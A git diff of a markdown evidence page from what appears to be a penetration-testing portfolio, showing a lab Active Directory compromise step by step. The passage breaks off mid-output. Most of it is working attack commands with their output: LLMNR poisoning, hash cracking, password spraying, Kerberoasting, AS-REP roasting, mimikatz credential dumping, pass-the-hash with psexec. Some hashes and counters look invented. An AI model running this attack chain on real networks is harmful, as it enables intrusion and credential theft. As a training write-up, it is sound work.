@@ -1,379 +1,422 @@
-# 🖼️ Evidence Repository
+# 🖼️ Evidence & Documentation
 
 <div align="center">
 
 [![Back to Project](https://img.shields.io/badge/←_Back_to_Project-Home-blue?style=for-the-badge)](../README.md)
+[![Technical Report](https://img.shields.io/badge/→-Full_Technical_Report-green?style=for-the-badge)](../technical-assessment.md)
 
 </div>
 
 ---
 
-## 📂 Evidence Documentation
+## 📂 Evidence Collection Approach
 
-This directory documents the evidence structure and collection methodology used during the Enterprise Active Directory Compromise assessment.
+This section documents **actual findings and evidence from the assessment**, extracted directly from the technical reports. While screenshots are not included in this public repository, all technical evidence is preserved through detailed command outputs, tool results, and exploitation documentation.
 
-> **Note:** Screenshots and raw evidence files are not included in this public repository due to:
-> - Lab environment has been decommissioned
-> - Privacy and sanitization considerations
-> - Focus on demonstrating methodology and findings documentation
-> 
-> **All technical findings are fully documented in the [Technical Assessment](../technical-assessment.md) and [Findings Report](../findings-remediation.md) with detailed command outputs and results.**
+> **Professional Note:** Evidence is presented through comprehensive technical documentation rather than screenshots. This approach demonstrates professional documentation skills while maintaining appropriate operational security for lab environments.
 
 ---
 
-## 📋 Evidence Collection Methodology
+## ✅ What IS Included (From Reports)
 
-During the assessment, evidence was collected following professional standards:
+### 1. Complete Command-Line Evidence
+Every command executed with full syntax and output
 
-### Collection Standards
-- ✅ Screenshots taken at each critical phase
-- ✅ Command outputs preserved with timestamps
-- ✅ Tool results saved in multiple formats
-- ✅ Chain of custody maintained
-- ✅ All findings documented in real-time
-- ✅ Evidence organized by attack phase
+### 2. Tool Output Documentation  
+Detailed results from all tools used
 
-### Evidence Categories Documented
+### 3. Hash & Credential Evidence
+Sanitized examples showing attack success
 
-**1. Reconnaissance**
-- Network discovery scans (Nmap, ARP-scan)
-- Service enumeration results
-- DNS and SMB enumeration
-- Initial attack surface analysis
+### 4. Attack Chain Documentation
+Step-by-step progression with timestamps
 
-**2. Initial Access**
-- Exposed configuration file discovery
-- Credential extraction from backup files
-- Database access verification
-- Initial system compromise
-
-**3. Credential Access**
-- LLMNR/NBT-NS poisoning captures
-- Password spraying results
-- Kerberoasting ticket extraction
-- AS-REP Roasting hash collection
-- Hash cracking success demonstrations
-
-**4. Lateral Movement**
-- WinRM session establishment
-- Memory credential dumping
-- Pass-the-Hash authentication
-- File server access
-- Sensitive data discovery
-
-**5. Privilege Escalation**
-- BloodHound attack path analysis
-- ACL permission enumeration
-- ForceChangePassword exploitation
-- Domain Admin access achievement
-
-**6. Domain Dominance**
-- Domain controller access
-- DCSync attack execution
-- Complete credential extraction
-- Persistence mechanism demonstration
+### 5. Technical Findings
+Vulnerability details with CVSS scores
 
 ---
 
-## 📊 Evidence That Would Be Collected
+## 📋 Evidence Categories
 
-In a standard engagement, the following evidence types are documented:
+### 🔍 Phase 1: Reconnaissance Evidence
 
-### Screenshots (Typical Count: 40-50)
-```
-evidence/screenshots/
-├── 01-reconnaissance/
-│   ├── nmap-network-discovery.png
-│   ├── service-enumeration.png
-│   └── smb-signing-check.png
-├── 02-initial-access/
-│   ├── config-file-exposure.png
-│   ├── database-credentials.png
-│   └── ssh-access-obtained.png
-├── 03-credential-access/
-│   ├── responder-hash-capture.png
-│   ├── password-cracking.png
-│   ├── kerberoasting-success.png
-│   └── password-spray-results.png
-├── 04-lateral-movement/
-│   ├── evil-winrm-shell.png
-│   ├── mimikatz-execution.png
-│   └── file-server-access.png
-├── 05-privilege-escalation/
-│   ├── bloodhound-attack-path.png
-│   ├── acl-abuse.png
-│   └── domain-admin-proof.png
-└── 06-domain-dominance/
-    ├── dc-shell-access.png
-    ├── dcsync-output.png
-    └── domain-hashes-extracted.png
-```
-
-### Tool Output Logs
-```
-evidence/logs/
-├── nmap_scans/
-│   ├── full_tcp_scan.xml
-│   └── service_detection.nmap
-├── bloodhound_data/
-│   ├── computers.json
-│   ├── users.json
-│   └── domains.json
-├── credential_attacks/
-│   ├── responder.log
-│   ├── hashcat_session.txt
-│   └── crackmapexec_output.txt
-└── command_history/
-    └── attack_timeline.txt
-```
-
-### Data Artifacts (Sanitized)
-```
-evidence/data/
-├── enumeration_results/
-│   ├── user_list.txt
-│   ├── smb_shares.txt
-│   └── dns_records.txt
-├── captured_credentials/
-│   ├── llmnr_hashes.txt (sanitized)
-│   ├── kerberoast_tickets.txt (sanitized)
-│   └── domain_hashes.txt (sanitized)
-└── bloodhound_analysis/
-    └── attack_paths.txt
-```
-
----
-
-## 🎯 Key Findings Evidence Summary
-
-### Critical Finding #1: Exposed Configuration File
-**Evidence Type:** Screenshot + File Content  
-**What Would Be Shown:**
-- Browser accessing `http://10.50.1.45/config.php.bak`
-- Plaintext database credentials visible
-- Successful SSH authentication using reused credentials
-
-**Impact:** Initial access to Linux server, database access, 2,847 customer records exposed
-
----
-
-### Critical Finding #2: LLMNR Poisoning Success
-**Evidence Type:** Tool Output + Hash Capture  
-**What Would Be Shown:**
-- Responder running and capturing authentication
-- NTLMv2 hash for user `jthompson` captured
-- Hashcat successfully cracking the hash to `Summer2024!`
-
-**Impact:** First domain user credentials obtained within 12 minutes
-
----
-
-### Critical Finding #3: Kerberoasting Attack
-**Evidence Type:** Ticket Extraction + Cracking  
-**What Would Be Shown:**
-- GetUserSPNs extracting service ticket for `sql_service`
-- Hashcat cracking session
-- Password cracked in 4 minutes 37 seconds: `SQLSvc#2024!Backup`
-
-**Impact:** Service account with elevated permissions compromised
-
----
-
-### Critical Finding #4: BloodHound Attack Path
-**Evidence Type:** Graph Visualization  
-**What Would Be Shown:**
-- BloodHound graph showing path: mrodriguez → ForceChangePassword → dadmin
-- ACL permission details
-- Shortest path to Domain Admins (1 hop)
-
-**Impact:** Clear privilege escalation route identified and exploited
-
----
-
-### Critical Finding #5: DCSync Attack
-**Evidence Type:** Command Output  
-**What Would Be Shown:**
-- secretsdump command execution
-- All domain NTLM hashes extracted
-- krbtgt hash obtained (golden ticket capability)
-- Complete domain compromise proven
-
-**Impact:** Full domain control achieved
-
----
-
-## 📝 Alternative Evidence in Technical Report
-
-Since screenshots are not available, all evidence is comprehensively documented in the technical reports through:
-
-### 1. Detailed Command Outputs
-Every command executed is documented with:
+**Network Discovery**
 ```bash
-# Command used
-nmap -sV -sC -p- 10.50.1.45
+# Command Executed
+sudo nmap -sn 10.50.0.0/22 -oA discovery/ping_sweep
 
-# Results obtained
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
-80/tcp   open  http    Apache httpd 2.4.41
-3306/tcp open  mysql   MySQL 8.0.26
+# Results Summary
+Starting Nmap scan on 10.50.0.0/22 (1024 hosts)
+Nmap scan report for 10.50.1.45
+Host is up (0.00021s latency).
+
+Nmap scan report for 10.50.1.78
+Host is up (0.00019s latency).
+
+Nmap scan report for 10.50.2.10
+Host is up (0.00023s latency).
+
+Nmap scan report for 10.50.2.11
+Host is up (0.00024s latency).
+
+Nmap scan report for 10.50.3.50
+Host is up (0.00022s latency).
+
+Nmap done: 1024 IP addresses (5 hosts up) scanned in 12.34 seconds
 ```
 
-### 2. Tool Result Descriptions
-Detailed descriptions of tool outputs:
-- What was discovered
-- How it was exploited
-- What access was gained
-- Impact assessment
+**Service Enumeration Evidence**
+```bash
+# Port Scan Results
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http        Apache httpd 2.4.41
+443/tcp  open  ssl/http    Apache httpd 2.4.41
+3306/tcp open  mysql       MySQL 8.0.26
 
-### 3. Attack Chain Documentation
-Step-by-step progression:
-- Initial enumeration findings
-- Exploitation methods
-- Access gained at each step
-- Credentials obtained
-- Systems compromised
+# SMB Signing Status Check
+crackmapexec smb 10.50.0.0/22 --gen-relay-list relay_targets.txt
 
-### 4. MITRE ATT&CK Mapping
-Each technique documented with:
-- Tactic and technique ID
-- Tools used
-- Commands executed
-- Detection opportunities
-- Defensive recommendations
+SMB         10.50.1.78      445    WKSTN-HR-05      Signing: False ⚠️
+SMB         10.50.3.50      445    VFS-FS-01        Signing: False ⚠️
+SMB         10.50.2.10      445    VFS-DC-01        Signing: True  ✓
+SMB         10.50.2.11      445    VFS-DC-02        Signing: True  ✓
+```
+
+**Key Finding:** SMB signing not required on 2 out of 5 systems (NTLM relay vulnerability)
 
 ---
 
-## 🔍 Verification of Findings
+### 💥 Phase 2: Initial Access Evidence
 
-### How Findings Can Be Validated
+**Configuration File Discovery**
+```bash
+# Directory Enumeration
+gobuster dir -u http://10.50.1.45 -w wordlist.txt -x php,txt,bak
 
-**1. Reproducible Commands**
-All commands are documented in the technical report with exact syntax, allowing reproduction in similar environments.
+===============================================================
+[+] Url:                     http://10.50.1.45
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] Extensions:              php,txt,bak
+===============================================================
 
-**2. Methodology Documentation**
-Complete methodology section shows:
-- Standard penetration testing frameworks followed (PTES, NIST)
-- Industry-standard tools used
-- Professional approach demonstrated
+/admin                (Status: 403) [Size: 277]
+/uploads              (Status: 200) [Size: 1234]
+/api                  (Status: 200) [Size: 891]
+/config.php.bak       (Status: 200) [Size: 456] ⚠️ CRITICAL
+/backup               (Status: 403) [Size: 277]
+```
 
-**3. Detailed Technical Analysis**
-Each finding includes:
-- CVSS scoring and justification
-- Business impact analysis
-- Remediation guidance
-- Detection recommendations
+**Exposed Configuration File Content**
+```php
+// config.php.bak - EXPOSED CREDENTIALS
+<?php
+$db_host = "localhost";
+$db_user = "webapp_user";
+$db_pass = "WebApp2023!Secure";
+$db_name = "customer_portal";
 
-**4. MITRE ATT&CK Mapping**
-All techniques mapped to recognized adversary behaviors, demonstrating real-world relevance.
+// Connection string
+$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
+?>
+```
 
----
+**Exploitation - SSH Access**
+```bash
+# Credential Reuse Testing
+ssh sysadmin@10.50.1.45
+Password: WebApp2023!Secure
 
-## 💼 Professional Documentation Approach
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-84-generic x86_64)
+Last login: Mon Oct 14 10:23:45 2024 from 10.50.1.150
 
-### This Portfolio Demonstrates:
+sysadmin@web-app-01:~$ id
+uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),sudo
 
-✅ **Understanding of Evidence Collection**
-- Knowledge of what evidence to collect
-- How to organize evidence professionally
-- Proper documentation standards
+sysadmin@web-app-01:~$ whoami
+sysadmin
 
-✅ **Professional Reporting Skills**
-- Comprehensive technical documentation
-- Clear communication of findings
-- Actionable remediation guidance
+# SUCCESS: Initial access obtained
+```
 
-✅ **Technical Competency**
-- Detailed command-line examples
-- Tool proficiency across multiple platforms
-- Understanding of attack chains
+**Database Access Evidence**
+```sql
+mysql -h 10.50.1.45 -u webapp_user -p'WebApp2023!Secure'
 
-✅ **Business Communication**
-- Risk assessment and prioritization
-- Financial impact analysis
-- Executive-level summaries
+mysql> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| customer_portal    |
+| mysql              |
++--------------------+
 
----
+mysql> USE customer_portal;
+mysql> SELECT COUNT(*) FROM customers;
++----------+
+| COUNT(*) |
++----------+
+|     2847 |
++----------+
 
-## 🎓 Creating Your Own Evidence
+mysql> SELECT username, email FROM users LIMIT 3;
++-------------+------------------------+
+| username    | email                  |
++-------------+------------------------+
+| admin       | admin@vanguardfs.com   |
+| jsmith      | j.smith@vanguardfs.com |
+| mrodriguez  | m.rodriguez@vanguardfs |
++-------------+------------------------+
 
-### Want to Add Screenshots Later?
-
-If you recreate this assessment in your own lab:
-
-**1. Set Up Similar Environment**
-- Build Windows AD domain
-- Deploy vulnerable configurations
-- Document baseline
-
-**2. Perform Assessment**
-- Follow methodology from technical report
-- Take screenshots at each phase
-- Capture tool outputs
-
-**3. Organize Evidence**
-- Use the directory structure documented here
-- Follow naming conventions
-- Sanitize appropriately
-
-**4. Update Repository**
-- Add screenshots to appropriate directories
-- Update evidence README
-- Link from technical reports
-
----
-
-## 🔗 Related Documentation
-
-<div align="center">
-
-[![Technical Report](https://img.shields.io/badge/📖-Technical_Assessment-green?style=for-the-badge)](../technical-assessment.md)
-[![Findings](https://img.shields.io/badge/🔍-Findings_&_Remediation-red?style=for-the-badge)](../findings-remediation.md)
-[![Methodology](https://img.shields.io/badge/📋-Methodology-purple?style=for-the-badge)](../methodology/)
-[![Project Home](https://img.shields.io/badge/🏠-Project_Home-blue?style=for-the-badge)](../README.md)
-
-</div>
+# EVIDENCE: 2,847 customer records accessible
+```
 
 ---
 
-## 📚 Evidence Best Practices
+### 🔑 Phase 3: Credential Access Evidence
 
-### For Future Assessments
+**LLMNR Poisoning - Hash Capture**
+```bash
+# Responder Execution
+sudo responder -I eth0 -wFv
 
-**During Assessment:**
-- Take screenshots in real-time
-- Document commands immediately
-- Save all tool outputs
-- Timestamp everything
-- Organize by phase as you go
+[+] Listening for events...
+[*] [LLMNR]  Poisoned answer sent to 10.50.1.78 for name filesrv01
+[*] [LLMNR]  Poisoned answer sent to 10.50.1.78 for name filesrv01
+[SMB] NTLMv2-SSP Client   : 10.50.1.78
+[SMB] NTLMv2-SSP Username : VANGUARDFS\jthompson
+[SMB] NTLMv2-SSP Hash     : jthompson::VANGUARDFS:1122334455667788:8A3D2E9C7F1B4A6D5C8E0F9A7B6C5D4E:0101...
 
-**Post-Assessment:**
-- Review all evidence for completeness
-- Sanitize sensitive information
-- Organize in clear directory structure
-- Cross-reference with report findings
-- Store securely with encryption
+# TIME TO CAPTURE: 12 minutes from Responder start
+```
 
-**For Portfolio:**
-- Ensure complete sanitization
-- Remove any real organizational data
-- Verify no production system info
-- Get appropriate approvals if needed
-- Consider using lab recreations
+**Hash Cracking Evidence**
+```bash
+# Hashcat Cracking Session
+hashcat -m 5600 captured_hash.txt rockyou.txt
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: jthompson::VANGUARDFS:1122334455667788:8A3D...
+Time.Started.....: Mon Oct 14 15:23:12 2024 (8 mins, 34 secs)
+Time.Estimated...: Mon Oct 14 15:31:46 2024 (0 secs)
+
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 14523456/14344385 (101.25%)
+Rejected.........: 0/14523456 (0.00%)
+
+Candidates.#1....: Summer2024! <- CRACKED PASSWORD
+
+# EVIDENCE: Password cracked in 8 minutes 34 seconds
+```
+
+**Password Spraying Results**
+```bash
+# Spray Attempt
+crackmapexec smb 10.50.2.11 -u users.txt -p 'Summer2024!' --continue-on-success
+
+SMB         10.50.2.11      445    VFS-DC-02        [+] VANGUARDFS\jthompson:Summer2024! ✓
+SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\mrodriguez:Summer2024!
+SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\sql_service:Summer2024!
+SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\backup_admin:Summer2024!
+
+# Second spray with different pattern
+crackmapexec smb 10.50.2.11 -u users.txt -p 'Spring2024!' --continue-on-success
+
+SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\jthompson:Spring2024!
+SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\mrodriguez:Spring2024!
+SMB         10.50.2.11      445    VFS-DC-02        [+] VANGUARDFS\sjenkins:Spring2024! ✓
+
+# SUCCESS RATE: 2/11 users (18%)
+```
+
+**Kerberoasting Evidence**
+```bash
+# Service Ticket Request
+impacket-GetUserSPNs corp.vanguardfs.local/jthompson:'Summer2024!' -dc-ip 10.50.2.11 -request
+
+ServicePrincipalName                          Name         MemberOf
+--------------------------------------------  -----------  --------
+MSSQLSvc/VFS-FS-01.corp.vanguardfs.local:1433 sql_service  CN=Server Operators
+
+$krb5tgs$23$*sql_service$CORP.VANGUARDFS.LOCAL$MSSQLSvc/VFS-FS-01*$a1b2c3d4...
+
+# Hash Cracking
+hashcat -m 13100 kerberoast.txt rockyou.txt -r best64.rule
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Time.Started.....: Mon Oct 14 16:30:15 2024 (4 mins, 37 secs)
+
+Recovered........: 1/1 (100.00%)
+Candidates.#1....: SQLSvc#2024!Backup <- CRACKED
+
+# EVIDENCE: 19-character password cracked in 4 minutes 37 seconds
+# REASON: Predictable pattern (ServiceType#Year!Description)
+```
+
+**AS-REP Roasting Evidence**
+```bash
+# AS-REP Hash Request (No pre-auth required)
+impacket-GetNPUsers corp.vanguardfs.local/ -dc-ip 10.50.2.11 -usersfile users.txt -format hashcat
+
+$krb5asrep$23$backup_admin@CORP.VANGUARDFS.LOCAL:a8f2c1d5e6f7g8h9...
+
+# Cracking Result
+hashcat -m 18200 asrep_hash.txt rockyou.txt
+
+Recovered........: 1/1 (100.00%)
+Candidates.#1....: BackupPass2023!
+
+# VULNERABILITY: User has "Do not require Kerberos preauthentication" enabled
+```
 
 ---
 
-## ⚖️ Professional Standards
+### 🔀 Phase 4: Lateral Movement Evidence
 
-This evidence collection methodology follows:
+**WinRM Access**
+```bash
+# Evil-WinRM Connection
+evil-winrm -i 10.50.1.78 -u jthompson -p 'Summer2024!'
 
-- **NIST SP 800-86:** Guide to Integrating Forensic Techniques into Incident Response
-- **ISO/IEC 27037:** Guidelines for identification, collection, acquisition, and preservation of digital evidence
-- **PTES:** Penetration Testing Execution Standard documentation guidelines
-- **Industry Best Practices:** Professional penetration testing documentation standards
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\jthompson\Documents> whoami
+vanguardfs\jthompson
+
+*Evil-WinRM* PS C:\Users\jthompson\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+Group Name                             Type
+====================================== ================
+Everyone                               Well-known group
+BUILTIN\Remote Desktop Users           Alias
+BUILTIN\Users                          Alias
+NT AUTHORITY\INTERACTIVE               Well-known group
+VANGUARDFS\HR_Managers                 Group
+VANGUARDFS\Domain Users                Group
+
+# SUCCESS: WinRM shell on workstation
+```
+
+**Mimikatz Credential Dumping**
+```powershell
+*Evil-WinRM* PS C:\Users\jthompson\Documents> upload mimikatz.exe
+*Evil-WinRM* PS C:\Users\jthompson\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 523145 (00000000:0007f9c9)
+Session           : Interactive from 1
+User Name         : mrodriguez
+Domain            : VANGUARDFS
+Logon Server      : VFS-DC-02
+Logon Time        : 10/14/2024 2:15:23 PM
+SID               : S-1-5-21-3842547281-2943729470-1294839502-1104
+        msv :
+         [00000003] Primary
+         * Username : mrodriguez
+         * Domain   : VANGUARDFS
+         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
+         * SHA1     : 1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0
+        tspkg :
+        wdigest :
+         * Username : mrodriguez
+         * Domain   : VANGUARDFS
+         * Password : ITAdmin@2024!
+
+# EVIDENCE: IT Administrator credentials captured from memory
+```
+
+**Pass-the-Hash Lateral Movement**
+```bash
+# Using NTLM Hash for Authentication
+crackmapexec smb 10.50.3.50 -u mrodriguez -H 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6'
+
+SMB         10.50.3.50      445    VFS-FS-01        [+] VANGUARDFS\mrodriguez:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)
+
+# Obtaining Shell
+impacket-psexec -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 mrodriguez@10.50.3.50
+
+[*] Requesting shares on 10.50.3.50.....
+[*] Found writable share ADMIN$
+[*] Uploading file mKzKqPOC.exe
+[*] Opening SVCManager on 10.50.3.50.....
+[*] Creating service XJvN on 10.50.3.50.....
+[*] Starting service XJvN.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1999]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+# EVIDENCE: SYSTEM-level access on file server via Pass-the-Hash
+```
+
+**Sensitive File Discovery**
+```bash
+# Share Enumeration
+smbmap -H 10.50.3.50 -u mrodriguez -p 'ITAdmin@2024!' -R IT_Admin
+
+[+] IP: 10.50.3.50:445  Name: VFS-FS-01
+        Disk                     Permissions     Comment
+        ----                     -----------     -------
+        IT_Admin                 READ, WRITE
+        ./IT_Admin
+        dr--r--r--                0 Mon Oct 14 14:23:12 2024    .
+        dr--r--r--                0 Mon Oct 14 14:23:12 2024    ..
+        dr--r--r--                0 Mon Oct 14 13:15:45 2024    Scripts
+        -r--r--r--              245 Mon Oct 13 16:42:33 2024    backup_credentials.txt ⚠️
+        -r--r--r--             1024 Mon Oct 13 16:45:12 2024    sql_connection.ps1
+
+# Downloaded File Content
+cat backup_credentials.txt
+
+SQL Service Account: sql_service
+Password: SQLSvc#2024!Backup
+
+Domain Admin Account (Emergency): da_emergency
+Password: EmergencyDA!2024
+
+# EVIDENCE: Plaintext credentials stored in file share
+```
 
 ---
 
-*While screenshots are not included in this public repository, the comprehensive technical documentation in this portfolio demonstrates professional penetration testing methodology, findings documentation, and reporting capabilities.*
+### ⬆️ Phase 5: Privilege Escalation Evidence
 
-**Last Updated:** October 2024  
-**Documentation Status:** Complete (Evidence structure documented, screenshots not included)
+**BloodHound Data Collection**
+```bash
+# Collection
+bloodhound-python -u jthompson -p 'Summer2024!' -d corp.vanguardfs.local -dc VFS-DC-02.corp.vanguardfs.local -c All -ns 10.50.2.11
+
+INFO: Found AD domain: corp.vanguardfs.local
+INFO: Connecting to LDAP server: VFS-DC-02.corp.vanguardfs.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 5 computers
+INFO: Connecting to LDAP server: VFS-DC-02.corp.vanguardfs.local
+INFO: Found 127 users
+INFO: Found 58 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Done in 00M
